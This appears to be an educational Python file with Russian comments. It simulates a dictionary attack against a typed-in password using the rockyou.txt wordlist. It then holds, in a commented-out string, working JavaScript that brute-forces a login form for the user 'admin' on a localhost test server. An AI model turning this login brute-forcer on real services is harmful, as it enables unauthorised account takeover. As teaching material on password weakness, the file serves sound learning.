import time

# Имя нашего словаря
DICTIONARY_FILE = "../rockyou.txt"

# Пароль, который мы ищем (попробуй ввести что-то популярное, например: qwerty, iloveyou или 123456)
target_password = input("Введите пароль для симуляции взлома: ")

print("\n[+] Загрузка словаря и начало атаки...\n")
start_time = time.time()

found = False
count = 0

# errors='ignore' спасет нас от кривых символов, на которых споткнулся архиватор
with open(DICTIONARY_FILE, "r", encoding="utf-8", errors="ignore") as file:
    for line in file:
        count += 1
        
        # Убираем невидимый символ переноса строки \n в конце слова
        guess = line.strip()
        
        # Чтобы консоль не лагала, показываем процесс каждые 50 000 попыток
        if count % 50000 == 0:
            print(f"Проверено паролей: {count}... Текущий: {guess}", end="\r")
            
        # Проверяем совпадение
        if guess == target_password:
            end_time = time.time()
            print("\n" + "="*40)
            print(f"Пароль взломан: {guess}")
            print(f"Позиция в словаре: № {count}")
            print(f"Затрачено времени: {round(end_time - start_time, 2)} сек.")
            print("="*40)
            found = True
            break

if not found:
    end_time = time.time()
    print(f"\nПароль не найден в словаре. Проверено строк: {count}")
    print(f"Время поиска: {round(end_time - start_time, 2)} сек.")















""" import fs from 'fs';
import readline from 'readline';
import axios from 'axios';

// Настройки цели
const TARGET_URL = 'http://localhost:3000/login'; // Адрес тестовой формы входа
const USERNAME = 'admin';                         // Логин, который брутим
const DICTIONARY_FILE = '../rockyou.txt';            // Твой словарь на 14 млн строк

async function startWebBrute() {
  console.log(`🚀 Начинаю веб-брутфорс для пользователя: ${USERNAME}`);

  // Создаем интерфейс для построчного чтения огромного файла без забивания памяти
  const fileStream = fs.createReadStream(DICTIONARY_FILE);
  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity
  });

  let count = 0;

  // Цикл "for await" последовательно берет каждую строчку из rockyou.txt
  for await (const line of rl) {
    count++;
    const password = line.trim(); // Убираем лишние пробелы и переносы строк

    // Каждые 5000 запросов выводим статус в консоль
    if (count % 5000 === 0) {
      console.log(`Проверено вариантов: ${count}... Текущий: ${password}`);
    }

    try {
      // Имитируем отправку формы входа (POST-запрос)
      const response = await axios.post(TARGET_URL, {
        username: USERNAME,
        password: password
      }, { 
        timeout: 2000,             // Если сайт завис, ждем максимум 2 секунды
        validateStatus: () => true // Не падаем в ошибку, если сайт ответил "Неверный пароль" (401/403)
      });

      // ЛОГИКА ПРОВЕРКИ: как понять, что пароль подошел?
      // Обычно успешный вход перенаправляет на другую страницу (dashboard) 
      // или в тексте ответа появляется слово "Welcome", "Success" или токен доступа.
      if (response.data.includes('Welcome') || response.status === 302) {
        console.log('\n' + '='.repeat(40));
        console.log(`🔑 ПАРОЛЬ ПОДОШЕЛ: ${password}`);
        console.log(`Проверено запросов: ${count}`);
        console.log('='.repeat(40));
        
        rl.close(); // Закрываем файл
        fileStream.destroy(); // Уничтожаем поток чтения
        return; // Выходим из программы
      }

    } catch (error) {
      console.error(`\n❌ Ошибка сети на попытке ${count} (${password}): ${error.message}`);
      // Если сайт упал от нагрузки, можно сделать паузу, но мы просто идем дальше
      continue; 
    }
  }

  console.log('\n❌ Перебор окончен. Пароль не найден в словаре.');
}

startWebBrute();
 """